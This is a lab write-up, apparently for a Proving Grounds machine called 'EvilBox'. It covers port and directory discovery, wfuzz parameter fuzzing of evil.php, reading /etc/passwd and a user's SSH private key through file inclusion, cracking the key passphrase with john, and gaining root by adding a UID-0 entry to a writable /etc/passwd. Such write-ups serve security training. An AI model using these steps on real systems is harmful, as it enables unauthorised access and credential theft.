# nmap

- 22 - ssh
- 80 - http apache

![](Screenshots/2022-10-19-18-08-24.png)


# gobuster

> Secret is suspicous.

![](Screenshots/2022-10-19-18-16-39.png)


## main

> Apache2 default page

![](Screenshots/2022-10-19-18-06-16.png)

> It's good practice to view source and check for comments, in this case there's nothing.

## robots.txt

![](Screenshots/2022-10-19-18-11-27.png)

## secret

![](Screenshots/2022-10-19-18-15-23.png)

> Let's run another discovery on secret, since there is nothing else.

![](Screenshots/2022-10-19-18-57-04.png)

> evil.php, quite an obvious way in.

![](Screenshots/2022-10-19-18-18-23.png)

> Hmm, could be some rce already, let's try some common command ones.

    http://evilbox.pg/secret/evil.php?command=id

    http://evilbox.pg/secret/evil.php?cmd=id

Nothing... We need to find the parameter used, or else it's sort of useless.

> Let's fire  up Burp and do some fuzzing, 

* param fuzzing with "id"
* param fuzzing with "/etc/passwd"

> Since my Burp intruder is throttled due to CE version, I'll do wfuzz instead.

> param fuzzing with value "id"

    wfuzz -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt --hl 0 'http://evilbox.pg/secret/evil.php?FUZZ=id'

![](Screenshots/2022-10-19-19-16-36.png)

> param fuzzing with value "/etc/passwd"

    wfuzz -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt --hl 0 'http://evilbox.pg/secret/evil.php?FUZZ=/etc/passwd'

![](Screenshots/2022-10-19-19-14-08.png)

> Great, we know the parameter now, as well as that it reads files.

    http://evilbox.pg/secret/evil.php?command=/etc/passwd

![](Screenshots/2022-10-19-18-32-36.png)

> we see that mowree is a user, let's try and get his ssh

    http://evilbox.pg/secret/evil.php?command=/home/mowree/.ssh/id_rsa

![](Screenshots/2022-10-19-18-34-22.png)

it's encrypted, so we need to crack the passphrase:

    ssh2john id_rsa > hash.txt

    john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

![](Screenshots/2022-10-19-18-44-49.png)

> Remember to change privs for id_rsa or else it's gonna get rejected

    chmod 600 id_rsa

> Now we can login as mowree

![](Screenshots/2022-10-19-18-45-14.png)

## user: Mowree

> we have our flag.

![](Screenshots/2022-10-19-18-46-22.png)

> Now we have to find a way to escalate our priviledges. Let's refer to our go to's:
* sudo -l
    * got nothing, however the system seems to be in Spanish?
* find / -perm /4000 2>/dev/null
    * Nothing...
* find / -writable 2>/dev/null
    * going through the list we notice something interesting tho.

            find / -writable 2>/dev/null   

![](Screenshots/2022-10-19-18-49-02.png)

> passwd is writable?!.. ok.

> Let's add a new user with root's ID, but first we need to generate a password

    openssl passwd password

## !!! TIP: Don't include your password in the syntax on actual systems, it'll be stored in  your history !!!

> Now we add the new user with root's ID

![](Screenshots/2022-10-19-18-51-05.png)

> Now we can switch users and we'll have root.

    su MythicalMoon
    >password



![](Screenshots/2022-10-19-18-53-21.png)

> root and flag proof:

![](Screenshots/2022-10-19-18-52-44.png)